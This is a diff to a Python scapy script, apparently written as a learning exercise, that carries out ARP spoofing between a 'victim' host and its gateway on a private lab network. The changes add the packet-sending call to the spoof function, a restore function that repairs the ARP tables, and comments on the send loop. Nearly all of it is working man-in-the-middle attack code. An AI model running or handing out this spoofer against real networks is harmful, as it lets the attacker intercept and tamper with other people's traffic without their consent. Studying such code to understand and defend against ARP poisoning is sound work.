@@ -25,14 +25,25 @@ def getMac(ip):
 # Hacker: 10.211.55.3/ 00:1c:42:2e:e8:18
 # op=1 ==> request
 # op=2 ==> response
-# target_ip = "10.211.55.4"
-# target_mac = "00:1c:42:83:95:fc"
-# spoof_ip = "10.211.55.1"
+# target_ip = "10.211.55.4" = victim_ip
+# target_mac = "00:1c:42:83:95:fc" = victim_mac
+# spoof_ip = "10.211.55.1" = ap_ip
+
+# 1. Hacker change mac address of default gateway ==> spoof
+# 2.
 
 
 def spoof(target_ip, spoof_ip):
     target_mac = getMac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+
+def restore(destination_ip, source_ip):
+    destination_mac = getMac(destination_ip)
+    source_mac = getMac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip,
+                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, verbose=False)
 
 
@@ -44,6 +55,7 @@ try:
         spoof("10.211.55.1", "10.211.55.4")
         sendPacketsCount = sendPacketsCount + 2
         # \r bỏ in theo dòng và ngang
+        # end = "" ==> quit ctrl + c
         print("\r[+] Packet sent" + str(sendPacketsCount), end='')
         # print nằm ngang
         # sys.stdout.flush()
